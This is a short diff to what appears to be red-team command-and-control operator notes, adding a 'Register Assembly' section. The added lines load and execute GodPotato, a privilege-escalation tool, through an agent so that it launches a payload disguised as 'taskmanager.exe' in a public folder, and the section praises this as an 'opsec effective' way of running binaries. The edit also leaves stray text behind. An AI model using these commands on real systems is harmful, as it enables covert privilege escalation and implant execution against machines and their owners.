@@ -74,10 +74,12 @@ Start-Process beacon.exe
 
 
 ## Register Assembly
-We can put dotnet binaries into the agent. This is an opsec effective way of executing 
+We can put dotnet binaries into the agent. This is an opsec effective way of executing binares
+
+N
 ```
 register_assembly GodPotato-NET4.exe
-
+execute_assembly -Assembly GodPotato-NET4.exe -Arguments "-cmd 'c:\users\public\taskmanager.exe'"
 ```
 
 ## References
